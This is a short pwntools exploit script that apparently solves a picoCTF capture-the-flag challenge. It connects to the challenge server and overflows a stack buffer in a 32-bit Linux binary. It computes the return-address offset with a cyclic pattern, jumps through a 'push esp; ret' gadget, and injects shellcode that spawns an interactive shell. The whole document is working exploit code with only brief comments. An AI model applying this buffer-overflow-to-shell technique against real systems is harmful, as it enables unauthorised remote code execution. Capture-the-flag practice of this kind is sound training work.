from pwn import *

# from pprint import pprint

context.update(arch='i386', os='linux') #acquired context from file command

elf = ELF("./vuln")
p = remote("saturn.picoctf.net", 62959) #ports may vary between different instance launched
# p = elf.process()

# pprint(elf.symbols)

#dmesg after running this shows us the IP being overwritten to 0x61616168
# p.sendline(cyclic(50)) 

print(p.recvuntil(b'\n')) #the prompt

payload = [
    cyclic(cyclic_find(0x61616168)),
    pack(0x080b075a), #push esp; ret;
    asm(shellcraft.sh()),
]

payload = b"".join(payload)
p.sendline(payload)

p.interactive()
p.close()